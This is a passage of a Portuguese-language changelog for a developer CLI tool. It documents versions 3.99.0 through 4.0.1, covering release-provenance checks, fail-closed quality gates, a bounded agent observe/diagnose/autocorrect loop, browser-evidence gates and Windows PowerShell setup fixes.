  - Fallow usa exit 1 = achados, 0 = limpo, ≥ 2 = erro operacional — por isso `exit 1
    COM achados` continua sendo análise legítima (quality), e o repo real (exit 1, 4
    achados não-bloqueantes) **segue passando**.
  - `tool_failed` **bloqueia sempre** (não só em `--strict`): falha de ferramenta é
    falha do gate. `log-only` continua não-bloqueante.
  - Propaga para `verify --profile release` e `proof` via exit 1 + `required:true` no
    passo `qg-l1/qg-l2`.
- Testes (`tests/test_qg_fail_closed.py`): o defeito exato do P0.1 (exit 2 + payload de
  erro + zero findings) agora **reprova**; exit ≥ 2 com achados, `verdict:error` em exit
  0, exit 1 sem achados → todos `tool_failed`; projeto limpo (exit 0, zero achados) e
  saída lista continuam **passando**; `tool_failed` bloqueia sem `--strict`. Os 6 testes
  do wrapper legado (caminho de qualidade) seguem verdes.

## [4.0.1] - 2026-07-12

### Sprint S41.0 — verdade da release: release-source-parity (PRD41 / PRD40 P0.2)

Abre o programa PRD41 (recuperação de integridade v4). Fecha o buraco de
auditabilidade: a v4.0.0 foi publicada com `gitHead` de um commit que depois foi
reescrito do histórico público (higienização do fixture de segredo) — o tarball não
podia mais ser reproduzido a partir da fonte declarada.

- **`src/release/source-parity.js`** (`release-source-parity`, puro/injetável):
  `checkSourceParity` verifica, quando há remoto, que (i) o commit a publicar está em
  algum branch remoto; (ii) a árvore **não está à frente** do remoto (nunca publicar
  ahead); (iii) a tag `vX.Y.Z` local e remota são o **mesmo objeto** (`git rev-parse`
  vs `ls-remote`, comparação por objeto-tag — garantia mais forte que "mesmo commit",
  robusta a tag anotada com/sem linha `^{}`); (iv, opcional `checkPack`) `npm pack
  --dry-run` reproduzível. **Fail-closed**: com remoto e paridade quebrada → `failed`;
  sem remoto → `not_applicable`.
- **`publish-guard`**: novo check HARD `release-source-parity` — bloqueia publish de
  commit/árvore não auditável a partir da fonte pública.
- **`scripts/test-pack.mjs`**: cache npm **isolado** por execução
  (`npm_config_cache` em temp) — mata o `EPERM` ambiental do cache compartilhado
  (P2.1), tornando o pack smoke determinístico.
- Testes: defeito da v4.0.0 (commit fora do remoto / árvore ahead / tag divergente)
  agora **bloqueia**; tag anotada compara o objeto direto; sem remoto → not_applicable;
  reprodutibilidade do pack. Provado no repo real (v4.0.0: commit no remoto, tag
  corresponde).

> **Proveniência honesta:** a partir de 4.0.1 a release é auditável a partir da fonte
> pública (`master`/tag no GitHub apontam para o mesmo commit publicado). A 4.0.0
> permanece publicada mas com `gitHead` órfão — recomenda-se `npm deprecate` apontando
> para >=4.0.1 (ação do mantenedor; o conteúdo empacotado é idêntico, `tests/` nunca
> entra no tarball).

## [4.0.0] - 2026-07-11

### Sprint D5 — prova de economia (Headroom real) + honestidade do ciclo fechado (PRD37 37.5/37.6) — FECHA o programa PRD35+PRD36+PRD37

Marco: o diferencial fundador restaurado com honestidade de ponta a ponta. O ciclo
Replit-parity roda, observa, autocorrige e versiona em checkpoints — e só afirma
economia **com prova de ledger**, só fecha `validated` **com evidência de navegador**.

- **`src/skills/loop-economy.js`** (`gstack.loop-economy.v1`, puro/injetável):
  - **`buildLoopEconomy`**: amarra o ciclo ao Headroom REAL (Fase C). Mede os tokens do
    loop (bounded) e só marca `claimable:true` com economia **provada pelo ledger**
    (`proveRouting`/C2: `calls>0` E `tokens_saved>0`). Enquanto não provado, o loop roda
    mas **NÃO afirma economia** — e no Full (default-on, C3) isso vira **PENDÊNCIA** com o
    comando de correção, não estado aceitável.
  - **`finalizeLoop`** (37.6): combina o verdito de observação (D1/D2) com a economia. O
    ciclo só é `validated` **com evidência de navegador limpa**; senão `degraded`/
    `needs_user`. A economia é um dado **separado** — rodar barato **nunca** valida o
    ciclo sozinho. `honest` resume as duas dimensões sem fingir nenhuma.
- **`loop economy --run <id> [--json]`**: fecha o ciclo — verdito + economia provada por
  ledger (ou a pendência honesta). Integração real com o proxy (C1 `proxyStatus`).
- **Prova E2E real** (dir neutro): `loop plan` → `loop checkpoint --green` → regressão no
  working tree → `loop rollback` restaura o ponto verde → `loop economy` reporta
  `degraded` (sem navegador) + `economia NÃO afirmada` com a pendência do Headroom —
  **tudo honesto, nada fingido**.
- Testes (`tests/loop_economy.test.js`): economia provada/não-provada; pendência no Full
  vs opt-out; `finalizeLoop` só valida com navegador; CLI integração real.

**Programa PRD35+36+37 COMPLETO** (v3.100.2→v4.0.0, 16 sprints): Fase 0 (onboarding PS
5.1 real) · Fase A (verdade dos gates + Action Kernel + enforcement honesto) · Fase B
(onboarding/skills/visual/hardening/proof) · Fase C (Headroom real: proxy lifecycle +
routing child-scoped + default-on no Full) · Fase D (ciclo Replit-parity: contrato +
observação + diagnose/autocorrect + checkpoints + economia). Invariante em cada sprint:
QG strict 0 · suíte verde · proof ready:true · nada é enfeite.

## [3.115.0] - 2026-07-11

### Sprint D4 — checkpoints Replit-like + rollback ao verde (PRD37 37.4)

Como o Replit: cada checkpoint é um **snapshot real de código + contexto** com
**rollback ao último ponto VERDE**. **Não é git commit** — não toca no histórico nem
no index do usuário.

- **`src/skills/loop-checkpoint.js`** (`gstack.loop-checkpoint.v1`, puro/io-injetável):
  - **`createCheckpoint`**: grava os `files` (relativos ao root) em
    `.gstack/runs/<runId>/checkpoints/<seq>/files/` **com sha256 + bytes** e o contexto
    do ciclo (`state`); `green:true` marca um ponto provado (diagnose passou, D3).
    Snapshot sem `files` é rotulado `hasCode:false` — **não mente que salvou código**;
    arquivo ausente vira `missing:true` (nunca finge captura).
  - **`listCheckpoints`/`lastGreenCheckpoint`**: leitura ordenada; o último verde é o
    ponto de retorno seguro.
  - **`rollbackToCheckpoint`/`rollbackToLastGreen`**: restauram ao working tree **só o
    que foi realmente capturado**; sem checkpoint verde → falha honesta
    (`nenhum checkpoint verde — nada provado para onde voltar`).
- **`loop checkpoint --run <id> [--files "a;b"] [--green] [--note "..."]`** e
  **`loop rollback --run <id> [--seq <n>]`** (sem `--seq` = último verde).
- Testes (`tests/loop_checkpoint.test.js`): snapshot com sha256 + seq incremental;
  arquivo ausente `missing`; só-contexto `hasCode:false`; **rollback restaura o
  conteúdo verde de verdade** após regressão no working tree; sem verde falha honesto;
  seq inexistente falha; CLI checkpoint→rollback ponta a ponta.

## [3.114.0] - 2026-07-11

### Sprint D3 — diagnose + autocorrect BOUNDED (PRD37 37.3)

O miolo do ciclo Replit-parity: compara a observação (D2) com a intenção/critérios e,
quando reprova, emite uma correção **limitada** — o LLM propõe, o verifier/observação
decidem (o LLM nunca é o gate final).

- **`src/skills/diagnose-loop.js`** (`gstack.diagnose-loop.v1`, puro/testável):
  - **`diagnoseObservation`**: VERIFIER determinístico — um critério de aceite só conta
    como atendido com **evidência explícita** (`observation.checks[criterio] === true`);
    nunca se presume "pronto". Reprova se a observação não validou, há problemas, ou algum
    critério está sem prova. Sem observação → reprova (o ciclo não rodou).
  - **`buildCorrectionRequest`**: contrato de correção **BOUNDED** (attempt/maxAttempts +
    `bounded`); budget esgotado → `stop:true` (pede usuário). **Nunca fabrica o patch** —
    devolve os alvos; o agente/LLM é quem propõe.
  - **`decideNext`**: decisão determinística — `passed`→checkpoint; reprovou dentro do
    budget→autocorrect; budget esgotado→stop/`needs_user`.
  - **`runDiagnosePhase`/`runAutocorrectPhase`**: registram com `recordPhase` (D1) —
    diagnose é fase de decisão (reprovar roteia p/ autocorrect); autocorrect registra a
    correção **proposta pelo LLM** e avança (a próxima observação valida).
- **`loop diagnose --run <id> [--json]`**: lê a última observação persistida por
  `loop observe`, diagnostica contra o aceite e imprime a correção bounded + próxima
  decisão; exit 1 se reprovou.
- Testes (`tests/diagnose_loop.test.js`): critério sem evidência nunca passa; correção
  bounded (propõe/stop); decisão do próximo passo; roteamento de fase; CLI.

## [3.113.0] - 2026-07-11

### Sprint D2 — camada de observação (navegador headless) (PRD37 37.2)

A fase `observe` do ciclo Replit-parity: com o app rodando, abre o navegador headless
(reusa o visual-gate B3) e devolve a observação que o contrato (D1) decide.

- **`src/skills/observe-layer.js`** (`gstack.observe-layer.v1`, puro/injetável):
  - **`observeRunningApp`**: espera **readiness bounded** (reusa `pollReadiness` do
    supervisor) e só então observa; app que **não responde** → `unreachable` — **nunca
    observa um app morto nem finge verde**. Reachable → roda o visual-gate (screenshot +
    console + rede + a11y, gravado no Evidence Ledger) e resolve o driver real (Playwright
    headless) **só se disponível**; sem driver → `needs_browser` (o ciclo não valida sem
    prova de navegador).
  - **`summarizeObservation`**: mapeia o resultado do gate para `{ visualValidated,
    problems }` — **só `validated`** conta como visualmente válido.
  - **`runObservePhase`**: registra a observação com `recordPhase` (D1) — a **observação
    determinística decide**: observação com erro roteia o ciclo de volta para `autocorrect`
    (o LLM nunca é o gate desta fase).
- **`loop observe --run <id> --url <url> [--json]`**: roda a fase `observe` sobre o
  `loop.json`, persiste o estado avançado e reporta o **verdito do ciclo**; exit 1 se a
  observação não validou.
- Testes (`tests/observe_layer.test.js`): app morto → unreachable; reachable+driver limpo →
  validated; reachable sem driver → needs_browser; avanço/roteamento de fase; CLI.

## [3.112.0] - 2026-07-11

### Sprint D1 — Loop Contract gstack.replit-loop.v1 + intenção específica (PRD37, abre Fase D)

Primeiro passo do diferencial fundador restaurado: o **contrato** do ciclo Replit-parity
`implement → run → observe → diagnose → autocorrect → checkpoint`. Só o CONTRATO/estado —
o motor de observação (D2), autocorreção (D3) e checkpoints (D4) constroem sobre ele.

- **`src/skills/replit-loop.js`** (`gstack.replit-loop.v1`, puro/io-injetável):
  - **`LOOP_PHASES` + `PHASE_DECIDER`**: as 6 fases e **quem decide cada uma** — o LLM
    propõe (`implement`/`autocorrect`), mas **runtime/observação/verifier DECIDEM**
    (`run`/`observe`/`diagnose`). O LLM **nunca é o gate final**.
  - **`classifyIntent`**: distingue **"criar projeto"** de **"implementar feature X"** e
    marca **scaffold genérico** (`isGenericScaffold`) — o ciclo não é scaffold, é a intenção
    específica (corrige o classificador por substring, PRD36 36.3–36.10).
  - **`buildLoopState`**: estado inicial **BOUNDED** (reusa `loop-budget`: máx N iterações +
    budget de tempo/tokens) — nunca loop caro infinito, nunca suíte inteira por iteração.
  - **`loopExhausted`**: encerra por iterações OU tempo OU tokens (sempre limitado).
  - **`recordPhase`**: avança as fases; **checkpoint** fecha 1 iteração; uma fase de
    **decisão que falha** volta o ciclo para `autocorrect`.
  - **`loopVerdict`**: só **`validated`** com **evidência de observação limpa**
    (`visualValidated && !problems`); senão `degraded`/`needs_user` — nunca finge o ciclo fechado.
  - **`persistLoopState`/`readLoopState`**: `.gstack/runs/<runId>/loop.json`.
- **`loop plan --intent "..." [--accept "c1;c2"] [--run <id>] [--json]`**
  (`src/commands/loop.js`): monta o contrato, grava `loop.json` e **avisa** quando a intenção
  é scaffold genérico. Camada **EXECUTION** (o ciclo roda o app e, em D3, autocorrige a fonte).
- Testes (`tests/replit_loop.test.js`): classificação de intenção, budget bounded, avanço de
  fases + roteamento decisão-falha→autocorrect, verdito só-com-evidência e persistência.

## [3.111.0] - 2026-07-11

### Sprint C3 — default-on no Full + callable_not_routed vira pendência (PRD35, fecha Fase C)

O usuário autorizou explicitamente o routing automático no Full. Entregue com as
invariantes intactas (routing **sempre child-scoped**, nunca global/wrap):

- **`src/tools/headroom-policy.js`** (`gstack.headroom.policy.v1`):
  - **`routeDefaultOn`**: no modo **Full** (e sem opt-out `GSTACK_HEADROOM_ROUTE=off`)
    o routing child-scoped é **default-on**.
  - **`headroomPendency`**: sob default-on, `callable_not_routed` (e
    `installed_not_callable`/`missing`) deixa de ser "estado aceitável" e vira uma
    **PENDÊNCIA a corrigir**, com a ação (`tools headroom start && enable`). Fora do
    Full, opt-in continua aceitável.
  - **`ensureRoutedChildEnv`**: no Full, **sobe o proxy se preciso** (reusa se já
    rodando) e devolve o env **child-scoped** roteado — **nunca muta o env
    global/shell do usuário**. Opt-out/não-Full/proxy-não-pronto → não roteia
    (honesto, env base intacto).
- **`proof --profile full`**: `callable_not_routed` passa a aparecer como
  **pendência** (`pending:true`) + **warning com o comando de correção** —
  **provado em máquina real**. `release`/opt-in seguem aceitando o estado.
- Testes: os 3 gatilhos de `routeDefaultOn`, pendência com/sem default-on, e os
  4 caminhos de `ensureRoutedChildEnv` (roteia / reusa / opt-out / proxy-não-pronto),
  todos confirmando que o **env base nunca é mutado**.

## [3.110.0] - 2026-07-11

### Sprint C2 — routing child-scoped + prova de tráfego por evidência (PRD35)

- **`src/tools/headroom-traffic.js`** (`gstack.headroom.traffic.v1`):
  - **`buildRoutedEnv`**: devolve um env NOVO **só para o processo FILHO** que o
    GStack spawna (`ANTHROPIC_BASE_URL` / `OPENAI_BASE_URL`+`/v1`) — **nunca muta
    o env do usuário nem toca config global**.
  - **`readHeadroomSavings`**: lê o **ledger real** do headroom
    (`savings --json`: `calls` / `tokens_saved` / `savings_percent`).
  - **`proveRouting`**: só afirma economia com **`calls > 0` E `tokens_saved > 0`**.
    Estados honestos: `proxy_off` · `savings_unavailable` · `routed_no_traffic`
    (proxy rodando mas sem tráfego LLM — **não afirma economia**) · `routed_proven`.
- **Provado em máquina real**: com o proxy ON mas sem tráfego, o verdito é
  `routed_no_traffic` / `economyClaimable:false` (`calls=0`). **Nenhuma economia é
  afirmada sem prova** — é o "não é enfeite" do usuário, agora imposto por código.
- **`tools headroom prove`**: reporta o verdito honesto do routing.
- Testes: `buildRoutedEnv` não muta o base (nada global); os 5 estados do verdito,
  incluindo `calls>0` mas `tokens_saved=0` → **routed mas sem economia afirmável**.

## [3.109.0] - 2026-07-11

### Sprint C1 — Headroom proxy lifecycle project-scoped (PRD35, Fase C)

O routing (opt-in, project-scoped) apontava um ENV para `127.0.0.1:8787`, mas
**ninguém subia o proxy** nessa porta — por isso o readiness ficava
`callable_not_routed` para sempre. Agora o GStack **gerencia o processo**:

- **`src/tools/headroom-proxy.js`** (`gstack.headroom.proxy.v1`): sobe
  `headroom proxy --host 127.0.0.1` (**loopback**, nunca `0.0.0.0`), aguarda
  **readiness real** (a porta aceita conexão TCP — nunca `sleep` cego), grava o
  **PID owned** em `.gstack/headroom/proxy.json` e encerra **só a árvore do
  processo owned** (nunca um foreign na porta).
- **Provado em máquina real**: `start → ready:true → status running/portOpen →
  stop → porta livre`, sem órfão. Três bugs reais achados **pela prova** (não
  pelos testes): (1) child não-detached morria junto com o CLI → `spawn
  detached`; (2) o launcher spawna um worker uvicorn filho → **kill de árvore**
  (`taskkill /T` no Windows, process-group no POSIX), senão orfanaria o listener;
  (3) cold start do uvicorn ~20s → janela de readiness ampla mas bounded (sai
  assim que a porta abre).
- **`tools headroom start|stop|status [--port N]`**: CLI do lifecycle. Recusa
  honesta quando não há venv (não há proxy p/ subir).
- **Invariantes intactas**: NUNCA `headroom wrap`, NUNCA MCP global, NUNCA editar
  config de harness. Só o binário local do venv do projeto.
- Testes: lifecycle com io injetado — inclui a prova de que `stop` **nunca mata
  processo foreign** (PID owned morto → só limpa o manifest, sem `kill`).

## [3.108.0] - 2026-07-11

### Sprint B5 — proof automático no encerramento + doc pública no npm (PRD36 36.10)

- **Proof automático no closeout**: `runCloseoutSync` ganha um `proof` injetável,
  **success-gated** (só roda em `done/ready/...`, nunca em run que parou/handoff)
  e **best-effort** (erro → `degraded`, nunca esconde nem lança). O run-loop
  injeta `closeoutReadiness`: a prontidão é **derivada do gate `verify` que já
  rodou no pipeline** — síncrono, bounded, **sem relançar a suíte** (evita
  lentidão/EBUSY por run). O proof completo continua sendo `proof` /
  `start --proof` explícito. O resultado entra no `closeout.{json,md}`.
- **Documentação pública empacotada no npm**: `docs/guides/` entra no
  `package.json.files` — as **9 guias** (first-run, examples, skill-gates,
  quickstart, capabilities, harness-matrix, install-paths, reset-uninstall,
  vps-ubuntu) passam a ir no tarball. Sem isso, quem instala não recebia a doc
  que a própria CLI referencia. Verificado: 9 arquivos no `npm pack`.
- Testes: closeout auto-proof (sucesso grava ready/blockers; handoff pula;
  runner que quebra → degraded) + empacotamento (`files` inclui `docs/guides/`;
  guias existem).
- **Nota de escopo**: o teste em máquinas limpas nos 3 SOs (parte do 36.10) é
  validação **manual do usuário** (fora da suíte automatizada).

## [3.107.0] - 2026-07-11

### Sprint B4 — hardening: classificador de intenção por palavra (PRD36 36.5)

- **`src/project-plan/keyword-match.js`**: match de keyword por **limite de
  palavra** (regex, acento-insensível, com cache), substituindo o
  `hay.includes(kw)` frágil. Bugs reais que sumiram: `api` casava *therapist*,
  `app` casava *apply*, `ia` casava *inteligencia*, `pr` casava *prazo*, `log`
  casava *login*. Keywords multi-palavra (`react native`) continuam casando.
- **`classifier.js` (recipe) e `loop-classifier.js`** passam a usar o matcher
  compartilhado — a mesma correção nos dois classificadores determinísticos.
- Regressão em `tests/intent_classifier.test.js`: false-positive de substring
  reprova, match por palavra inteira e multi-palavra funcionam, sinais explícitos
  (`hasRuntimeError`) ainda decidem.
- **Escopo honesto**: o **contrato Full já BLOQUEIA** em componente obrigatório
  degradado (a parte "falha" do 36.4, herdada do PRD12 — `full-contract.js`); o
  **rollback transacional completo** (36.4 "restaura") e o **isolamento total de
  HOME nos testes** (36.3) ficam como follow-up de hardening — não foram
  entregues neste sprint e continuam rastreados.

## [3.106.0] - 2026-07-11

### Sprint B3 — gate visual EXECUTADO (PRD36 36.9, base do PRD37 37.2)

O `visual-validation-gate` era só **declarado** (Playwright era dependência, mas
nada abria o navegador). Agora **executa**:

- **`src/skills/visual-gate.js`** (`gstack.visual-gate.v1`): `runVisualGate`
  observa a página (driver **injetável**; o real é Playwright via lazy-import),
  captura **screenshot + console + rede + acessibilidade** como EVIDÊNCIA e grava
  no Evidence Ledger (`skill-evidence.json`). Avaliação determinística: erro de
  console / request ≥ 400 / violação de a11y / screenshot ausente → `failed`
  (BLOQUEIA); tudo limpo → `validated`.
- **Honestidade "nada é enfeite"**: sem driver de navegador → `needs_browser`
  (BLOQUEIA) — **nunca finge verde**. `browserDriverAvailable()` reporta a
  verdade (hoje `false`: playwright não está instalado, então o gate diz
  claramente que não pode validar em vez de mentir).
- **CLI `visual check --url <endereço>`** (knowledge): executa o gate no app
  rodando, grava evidência, exit 1 se bloqueado.
- **Verdade dos gates**: `visual-validation-gate` ganhou `implementedBy` +
  `provedBy` e **sai dos "declarados-apenas"** — o `gate-truth` agora o conta
  como `enforced` (ship). Declarados-apenas restantes: db-migration, rls,
  context-pack.
- Testes: os 5 caminhos (validated / needs_browser / console-erro / 5xx / a11y /
  sem-screenshot) com driver fake + `browserDriverAvailable` honesto + evidência
  gravada no ledger.

## [3.105.0] - 2026-07-11

### Sprint B2 — skills comprováveis por evidência + paridade cross-platform (PRD36 36.8/36.8b)

- **`skills reach` (`src/skills/skill-reach.js`, `gstack.skill-reach.v1`)**:
  responde POR EVIDÊNCIA "quantas skills cada harness realmente enxerga" —
  absorve a antiga rec #1 do oh-my-openagent. `skills_dir` (claude/opencode) →
  reach **medido** (skill presente no diretório que o harness auto-carrega);
  `instructional` (codex/cursor) → reach por-skill `null` (vê um **ponteiro** em
  AGENTS.md/regras, **não** N skills). reach `0/N` num `skills_dir` = a doc
  prometeu auto-load inexistente → `ok:false` + `zeroReach`. **Resultado real
  hoje: claude 0/197 (dir vazio!), opencode 105/197** — a evidência que faltava
  para o claim "auto-load" do OpenCode/Claude.
- **command-lint estendido (36.8b)**: `lintShellFences` flagra fence ```bash/sh
  com token PowerShell (`.ps1`, `$env:`, `Copy-Item`, `robocopy`, …) — quebra
  quem copia no bash (macOS/Linux). `runSkillLint` = comando inexistente + fence
  quebrado por skill.
- **Fix de campo**: **12 fences ```bash→```text** em 5 skills
  (project-init, artifacts, mcp-setup, migrate-to-multi-artifact, new-project)
  que continham PowerShell — o problema exato do transcript (paridade quebrada).
- Testes: `skill_reach.test.js` (reach por evidência com io injetado: medido /
  zeroReach / instrucional=null) e `skill_lint.test.js` (varre **todas** as
  skills — nenhuma pode ter fence shell com PowerShell).

## [3.104.0] - 2026-07-11

### Sprint B1 — onboarding determinístico: executor real (PRD36 36.6)

O `project-init` era uma skill **instrucional** — o LLM improvisava quando um
script falhava e declarava "instalado com sucesso" sobre um passo que caiu em
fallback (o falso-verde do transcript de campo). Agora existe um **executor**:

- **`src/skills/onboarding.js`** (`gstack.onboarding.v1`): dado o projeto + as
  ferramentas escolhidas + variante, **roda os `setup-*.ps1/.sh`** (os mesmos
  corrigidos no S0) e **VERIFICA o artefato** de cada uma. Status honesto:
  `installed` (artefato presente; gstack com `variant/api_dir/db_package`
  provados) · `degraded` (script falhou OU config a meio — **nunca "sucesso"**) ·
  `failed` (artefato ausente — marcador não instala) · `skipped`. `ok` exige
  `installed>0` e zero `failed/degraded`. `io` injetável (testável sem spawnar).
- **`onboarding run` (CLI, execution layer)**: executa, grava
  `.gstack/onboarding/report.{json,md}` e retorna **exit 1** se não estiver
  pronto. `project-init/SKILL.md` passa a **apontar para o executor** em vez de
  mandar rodar os `.ps1` na mão.
- Testes: os 4 status honestos com `io` injetado (incl. o **falso-verde** —
  script falhou mas artefato existe → `degraded`) + **integração real no win32**
  rodando os 5 setups e verificando 9 artefatos.
- Nota: a seleção de harness/modelo/esforço do `start` já existia
  (`model-preflight`, F3-B); B1 fecha o buraco de campo (onboarding executável).

## [3.103.0] - 2026-07-11

### Sprint A3 — enforcement cross-harness honesto (PRD36 36.2)

- **`post_tool_use_review.py` deixa de rodar `npx fallow audit` COMPLETO por
  ação** (caro, repetia o erro da v2.2.0). Agora é um **roteador incremental
  limitado**: classifica o arquivo tocado e recomenda a checagem certa (testes
  da área / typecheck / evidência de navegador / migration), espelhando
  `classifyDiff`/`stepClose` do Action Kernel. É **advisory** e **fail-open**.
- **Claude passa a registrar `PostToolUse` de verdade** (`claude.js`, matcher
  `Write|Edit`) — o hook existia mas **nunca estava wired**. Honestidade: o
  PostToolUse OBSERVA/roteia; não desfaz a ação já executada.
- **`tool.after` do Claude: `enforced` → `advisory`** em `events.js` — um hook
  pós-ação não pode bloquear o que já rodou; declarar enforced era desonesto.
- **Invariante estrutural no conformance**: **nenhum** harness pode declarar
  `tool.after=enforced` (`forbidden_claim`), somando-se à regra que já proibia
  instrucional=enforced. `checkEvent` reescrito como tabela `CLAIM_RULES`.
- Testes: `enforcement_honesty.test.js` (nenhum tool.after enforced; conformance
  ok; declaração falsa é acusada), `hooks_registration` cobre o PostToolUse, e
  `test_post_tool_review.py` (Python) prova o roteador incremental — recomenda a
  checagem por tipo, **nunca menciona fallow/suíte completa**, e é fail-open.
- Nota: 3 falhas pré-existentes em `test_per_project_activation.py` são
  ambientais (falham igual no master) — fora do escopo deste sprint.

## [3.102.0] - 2026-07-10

### Sprint A2 — Action Checkpoint Kernel (PRD36 36.1)

Fim do "tudo ou nada" (a suíte no Stop): checkpoints POR AÇÃO em 3 níveis,
bounded — **`src/skills/action-kernel.js`** (`gstack.action-kernel.v1`):

- **Nível 1 `preAction`**: policy, secrets, comando destrutivo, escopo (não
  escreve fora do workspace — lição CWD-guard), plano e design — checagens
  **determinísticas, sem rede**. Decisão `allow|warn|deny`; `gatesExecuted` lista
  só as checagens que **realmente rodaram** (não as declaradas). Reusa
  `redactSecrets`/`hasSecret` e `isUiWrite`; padrões destrutivos em sincronia
  com o plugin OpenCode.
- **Nível 2 `postAction`**: recibo **redigido** — arquivos, exit code e digests
  de entrada/saída. **Nunca o prompt bruto, nunca segredo, nunca o conteúdo cru.**
- **Nível 3 `stepClose`**: escolhe a checagem pelo **tipo do diff**
  (`classifyDiff`: migration/frontend/backend/test/config/docs) — testes
  incrementais, QG, evidência de navegador ou migration conforme o caso. **Nunca
  a suíte inteira por edição** (o erro da v2.2.0); `ranFullSuite:false`.
- **Ledger `.gstack/runs/<runId>/actions.jsonl`** append-only e **sanitizado**
  (remove campos proibidos, redige, trunca): reconstrói o que rodou.
- **CLI `actions ledger|bench`**: `ledger` mostra as ações do run; **`bench`
  PROVA o DoD** — pre-action p95 **< 250ms sem rede** (real hoje: **p95 ~0,05ms**,
  três ordens de grandeza sob o budget; exit 1 se estourar).
- Honestidade de escopo: o kernel é o **mecanismo** + ledger + prova de p95; a
  ligação nos eventos reais de cada harness (produtor de ações) é o Sprint A3 (36.2).

## [3.101.0] - 2026-07-10

### Sprint A1 — a verdade dos gates (PRD36 36.0)

`declared` ≠ `routed` ≠ `executed` ≠ `blocking` ≠ `proved` — sempre separados:

- **`src/skills/gate-truth.js`** (`gstack.skill-gate-truth.v1`): fonte ÚNICA dos
  5 estados por gate×harness. `routed` deriva de `EVENT_DECLARATIONS` (events.js —
  fim da cópia local `HARNESS_HOOK_SUPPORT` no harness-projection); `executed` =
  implementação real (`implementedBy`); `blocking` = pode negar naquele harness
  (ship=CLI; pre-write=só onde `file.write` é `enforced` — `partial` não garante);
  `proved` = **teste negativo citado em `provedBy` e VERIFICADO** (o arquivo
  existe e contém o nome). **`enforced` exige executed+blocking+proved.**
- **REMOVIDO o claim "todo gate pre-write é aplicado pelo hook do Claude"**:
  `projectGate` agora deriva do gate-truth. Blocking **só declarado** (sem
  implementação) é `advisory` em TODO harness — `db-migration-gate`, `rls-gate`,
  `visual-validation-gate` e `context-pack-required-gate` não fingem mais.
- **`skills gates doctor [--json]`**: a verdade no CLI + artefatos
  `.gstack/skills/gate-truth.{json,md}`. Resultado real hoje: **declared 12 ·
  executed 8 · proved 6; claude 6 enforced, codex/opencode/cursor 2** — nunca
  mais "12/12" só porque a matriz é válida. Prova citada que não existe = exit 1.
- **`gate-matrix.js`**: os 6 gates com bloqueio comprovado citam o teste negativo
  (`provedBy`): cwd-health, plan-before-code, design-system, secret-deny,
  worktree-required, verify-proof. Anti-regressão em `tests/gate_truth.test.js`
  (declared>executed>proved; prova quebrada reprova; declarado-apenas nunca enforced).
- Honestidade de escopo: `capabilities.js` (ADAPTER_MATRIX, domínio dos agentes)
  segue separado — a unificação do enforcement cross-harness é o Sprint A3 (36.2).

## [3.100.2] - 2026-07-10

### Sprint 0 do programa PRD35/36/37 — onboarding Windows de verdade (PRD36 36.7/36.8)

Bugs reais encontrados por transcript de campo (usuário rodando `project-init` numa
máquina Windows com PowerShell 5.1) e **provados por execução real** antes do fix:

- **fix(setup): `setup-gstack.ps1` quebrava o parse no PowerShell 5.1** por DUAS
  causas: `||` (sintaxe PowerShell 7+) e **UTF-8 sem BOM lido como ANSI** (o último
  byte do `✓` vira smart-quote `“` e mata a string). Resultado real: exit 1 e
  `.gstack/config.json` **nunca era criado** — a falha exata do transcript. Agora:
  helper `Get-ToolVersion` (try/catch) e scripts 100% ASCII (convenção asciiSafe do 26.A).
- **fix(setup): `setup-superpowers.ps1` gerava um `run.ps1` CORROMPIDO**: o
  here-string era interpolado, então `$Command` (indefinido no momento do setup)
  expandia para vazio (`[string] = 'help'`, `switch ()` = parse error). Agora
  here-strings literais; `run.ps1` gerado parseia e `run.ps1 help` executa.
- **fix(setup): `setup-context7.ps1` era um falso-verde perfeito**: `typescript = true`
  (sem `$`) vira comando inexistente no PowerShell → **exit 0 sem escrever
  `stack.json`**. Ferramenta "instalada" sem artefato. Agora `$true`.
- **test(setup): regressão `tests/setup_scripts_ps51.test.js`** — lint estático
  cross-platform (ASCII puro, sem sintaxe PS7-only, booleanos com `$`, here-string
  literal no gerador de .ps1) + integração win32: roda os 5 scripts no
  `powershell.exe` 5.1 real e exige exit 0, os 9 artefatos e `run.ps1` executável.
- **docs(skills): `project-init` ganhou "Honestidade da instalação"**: script que
  falha = `degraded` (nunca "instalado com sucesso"); ferramenta só é "instalada"
  com **artefato verificado**; resumo final separa instalado/degraded/pulado/falhou.

## [3.100.1] - 2026-07-09

### Correções encontradas em teste de máquina limpa (Windows, pacote instalado)

- **fix(skills): `skills catalog/doctor/gates/harness/baseline/why` mediam o `cwd`
  do usuário em vez do PACOTE.** Instalado numa pasta vazia, `skills catalog` dava
  **0 skills** e `skills gates show` marcava os 12 gates como "skill desconhecida".
  Agora a FONTE do catálogo é `SKILL_PACKAGE_ROOT` (onde as skills são shipadas —
  mesma lição CM-08 que o `route.js` já seguia); os artefatos continuam gravados em
  `cwd/.gstack`. Regressão coberta por teste rodando de um cwd neutro.
- **fix(update): o hint de atualização usava `&&`, que não existe no PowerShell do
  Windows** (produto é Windows-first). Agora imprime os dois passos separados
  (`npm install -g …@latest` / `gstack_vibehard install`), válidos em PowerShell,
  cmd e bash; `--json` ganhou `steps: [...]`.

## [3.100.0] - 2026-07-08

### Guias first-run/examples/skill-gates + `skills why <gate>` (PRD34 F7-B / PRD30 30.5+30.6 + PRD29 29.8)

- **`skills why <gate> [--json]`** + `explainGate` em `gate-matrix.js`
  (`gstack.skill-gate-explain.v1`): explica um gate — por que existe, o que checa,
  como satisfazê-lo (evidência tem prioridade sobre a pergunta), o que o `fallback`
  significa, e o **enforcement REAL por harness** (reusa `projectGate`).
- **`docs/guides/first-run.md`** (transcript leigo, sem segredos),
  **`examples.md`** (por intenção), **`skill-gates.md`** (o que cada gate checa e
  por quê). Todos passam o `command-lint`.
- **command-lint** agora varre também `docs/guides/*.md` e só conta citações em
  **contexto de código** (blocos/spans) — elimina falso-positivo de prosa. Pegou e
  corrigiu um bug real: `vps-ubuntu.md` citava `gstack_vibehard agent-reach` em vez
  de `gstack_vibehard tools agent-reach`.

## [3.99.0] - 2026-07-08

### Command-lint na CI + paridade PT-BR/EN (PRD34 F7-A / PRD30 30.3+30.4)

- **`src/meta/command-lint.js`** (`gstack.command-lint.v1`): `ALL_CLI_COMMANDS`
  (união do firewall Knowledge/Execution = fonte única), `citedCommands`/
  `lintCommands` (comando de topo citado que não existe no CLI), `commandParity`
  (comandos citados só num README — divergência PT×EN), `runCommandLint`. **GATE:**
  `ok` = zero comando inexistente (a doc nunca engana o leigo); `parityOk` é
  reportado à parte (divergência PT×EN = WARNING, não bloqueia). PURO/testável.
